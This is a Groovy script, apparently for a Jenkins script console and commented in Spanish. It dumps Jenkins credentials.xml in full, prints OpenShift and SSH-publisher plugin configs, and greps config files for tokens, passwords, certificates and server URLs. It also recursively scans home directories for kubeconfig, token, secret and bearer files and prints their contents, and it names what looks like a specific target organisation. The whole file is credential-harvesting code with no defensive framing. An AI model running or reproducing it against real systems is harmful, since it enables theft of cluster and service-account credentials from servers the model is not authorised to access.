// Leer XMLs específicos de OpenShift plugin y buscar tokens/service accounts
// También dump completo de credentials.xml

println "=== OPENSHIFT XML + CREDENTIALS DUMP ==="

// 1. Leer com.openshift.jenkins.plugins.OpenShift.xml
def xmlFiles = [
    "/var/jenkins_home/com.openshift.jenkins.plugins.OpenShift.xml",
    "/var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml",
]

xmlFiles.each { path ->
    def f = new File(path)
    if (f.exists()) {
        println "\n=== ${path} ==="
        println f.text
    }
}

// 2. Dump completo de credentials.xml (sin filtros)
println "\n=== CREDENTIALS.XML FULL ==="
def credXml = new File("/var/jenkins_home/credentials.xml")
if (credXml.exists()) {
    println credXml.text
}

// 3. Leer sección kubernetes/openshift de config.xml
println "\n=== CONFIG.XML - OpenShift/Kubernetes Section ==="
def configXml = new File("/var/jenkins_home/config.xml")
if (configXml.exists()) {
    def content = configXml.text
    // Buscar configuración de Kubernetes cloud
    def lines = content.split("\n")
    def inSection = false
    def braceCount = 0
    lines.eachWithIndex { line, i ->
        def ll = line.toLowerCase()
        if (ll.contains("kubernetes") || ll.contains("openshift") || ll.contains("amxnova") ||
            ll.contains("org.csanchez.jenkins.plugins.kubernetes") || ll.contains("serverurl")) {
            inSection = true
        }
        if (inSection) {
            println line
            // Imprimir contexto (20 líneas antes y después)
            if (line.contains("serverUrl") || line.contains("serviceAccount") || 
                line.contains("token") || line.contains("credentials")) {
                println "^^^ CRITICAL LINE ^^^"
            }
            // Stop after 50 lines of a section
            braceCount++
            if (braceCount > 50 && line.contains("</")) {
                inSection = false
                braceCount = 0
                println "..."
            }
        }
    }
}

// 4. Leer el XML del plugin docker-slaves que contiene config de Kubernetes
println "\n=== DOCKER-SLAVES.XML ==="
def dockerSlaves = new File("/var/jenkins_home/docker-slaves.xml")
if (dockerSlaves.exists()) {
    def content = dockerSlaves.text
    content.split("\n").each { line ->
        def ll = line.toLowerCase()
        if (ll.contains("server") || ll.contains("token") || ll.contains("url") || 
            ll.contains("amxnova") || ll.contains("openshift") || ll.contains("cert") ||
            ll.contains("password") || ll.contains("credential") || ll.contains("namespace")) {
            println line
        }
    }
}

// 5. Buscar en el home por archivos .oc, .kube, tokens
println "\n=== HOME DIR SCAN ==="
["/var/jenkins_home", "/root", "/home/jenkins"].each { dir ->
    def d = new File(dir)
    if (d.exists()) {
        println "\nScan: ${dir}"
        d.eachFileRecurse { f ->
            try {
                def n = f.name.toLowerCase()
                if (n.contains("token") || n.contains("kube") || n.contains("openshift") || 
                    n.contains(".oc") || n.contains("amxnova") || n.contains("kubeconfig") ||
                    n.contains("secret") || n.contains("bearer")) {
                    println "  FILE: ${f.absolutePath} (${f.size()} bytes)"
                    if (f.size() < 10000) println f.text
                }
            } catch(e) {}
        }
    }
}

println "\n=== FIN ==="
